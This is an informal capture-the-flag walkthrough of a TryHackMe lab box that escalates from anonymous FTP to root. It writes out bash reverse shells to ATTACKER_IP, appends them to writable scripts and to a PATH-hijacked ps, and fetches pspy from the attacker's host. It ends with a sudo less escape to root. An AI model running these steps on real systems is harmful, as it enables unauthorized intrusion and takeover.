ATTACKER_IP = <ATTACKER_IP>, TARGET_IP = <TARGET_IP>

`nmap -sS TARGET_IP`

okay, 21 and 22 are open

`nmap -sC -sV -p21,22 TARGET_IP`
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1

ftp: Anonymous FTP login allowed

let's try the ftp
```
ftp> ftp
(to) TARGET_IP
Connected to TARGET_IP.
220 (vsFTPd 3.0.5)
Name (TARGET_IP:root): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>  
```

```
ls
# incoming
# pub

cd /pub
ls -l (changed for readability)

# drwxr-xr-x archive
# drwxrwxrwx uploads
```

/pub/uploads seems exploitable...


nope, we go back to /incoming

quick revshell: 
`#!/bin/bash bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1`

it works, now we have shell as recon_user
I tried installing pspy but wasn't able to, so I just cd and ls'ed around until I found /opt/dev/backup.sh, a script that we can write to and will probably get us to dev_user

`echo 'bash -i >& /dev/tcp/ATTACKER_IP/6666 0>&1' >> /opt/dev/backup.sh`

now we just `nc -lvnp 6666` on attacker and got **dev_user**'s shell

very *uncreative* challenge - same command over and over

let's get pspy to dev_user

atttacker:

`wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64`

`python3 -m http.server 8000`

dev_user:

`wget http://ATTACKER_IP:8000/pspy64 -O /tmp/pspy64`

`chmod +x /tmp/pspy64`

`/tmp/pspy64`


### --quick tangent --

How to upgrade a revshell
```
# inside the revshell
# if there is no python3 - two other possibilities
#1) python -c 'import pty; pty.spawn("/bin/bash")'
#2) script /dev/null -c /bin/bash

python3 -c 'import pty; pty.spawn("/bin/bash")'

# the rest is same for all options
Ctrl + Z

# in the listener tab do this

stty raw -echo; fg

# press enter 1-2 times till shell prompt appears

# do this for no reason at all:
export TERM=xterm-256color
```

### --tangent out--

so we ran pspy64 and we found healthcheck running about 2 times a second...

`2026/08/10 12:40:41 CMD: UID=1003  PID=3973   | /bin/bash /usr/local/bin/healthcheck`

`id 1003`

uid=1003(monitor_user) gid=1003(monitor_user) groups=1003(monitor_user)

okay let's check it out

`systemctl | grep health`

healthcheck.service and healthcheck.timer

we would love to know which binary is associated with this healthcheck.service process

`systemctl status healthcheck.service`

loaded (/etc/systemd/system/healthcheck.service; static)

more info pls

`cat /etc/systemd/system/healthcheck.service`

thx
```
[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

okay, I got a hint and it has to do with ps being ran without specifying full path.

#### what this means:
1) from the PATH we saw /opt/dev/bin, this is the first place where healthcheck.service looks for ps
2) we will append a revshell to ps, because we can

`cd /opt/dev/bin`

`cat ps`

```
dev_user@tryhackme-2404:/opt/dev/bin$ cat ps
#!/bin/bash
setsid bash -i >& /dev/tcp/10.82.84.138/5557 0>&1
```

okay we just append the same thing just with our IP

we will use just 1 port away for maximal ragebait

`echo "setsid bash -i >& /dev/tcp/ATTACKER_IP/5558 0>&1" >> ps`

chmod a+x, not chmod +x
`chmod a+x ps`

now we have monitor_user

we will repeat the --quick tangent -- commands, cause you get ctrl + c without destroying revshell and also tab completions

we can finally run sudo

`sudo -l`

```
User monitor_user may run the following commands on tryhackme-2404:

(ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

`cd /usr/local/bin/`

now we `cat deploy.sh` and see:
```
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```
why did I run this? `find / -name deploy.sh 2>/dev/null` i dont know..

`find / -name deploy_helper.sh 2>/dev/null`

found at `/opt/app/deploy_helper.sh`

and it does... bik drumrol plz.. `sleep(2)`.

you gotta dream big, it will become a revshell today...

`ls -l /opt/app/deploy_helper.sh`

-rwxr-xr-x 1 monitor_user monitor_user   90 Feb  2  2026 deploy_helper.sh

let's do it:

`cd /opt/app/ && echo "setsid bash -i >& /dev/tcp/ATTACKER_IP/5559 0>&1" >> deploy_helper.sh`

now we run it as ops_user (not as us - yes I tried that at first lol)

`sudo -u ops_user /usr/local/bin/deploy.sh`

```
[+] Deploy helper running
[+] Syncing application files
# i shouldve added "initializing revshell" here...
```

okay, another shell upgrade... copy paste the commands in my tangent

`sudo -l`

```
User ops_user may run the following commands on tryhackme-2404:
    (root) NOPASSWD: /usr/bin/less
```

oh yeah

[gtfobins - less](https://gtfobins.org/gtfobins/less/)

letsgo
```
ops_user@tryhackme-2404:/usr/bin$ sudo -u root /usr/bin/less /etc/hosts

# now we write this
!/bin/bash

# now we are root

id
uid=0(root) gid=0(root) groups=0(root)
```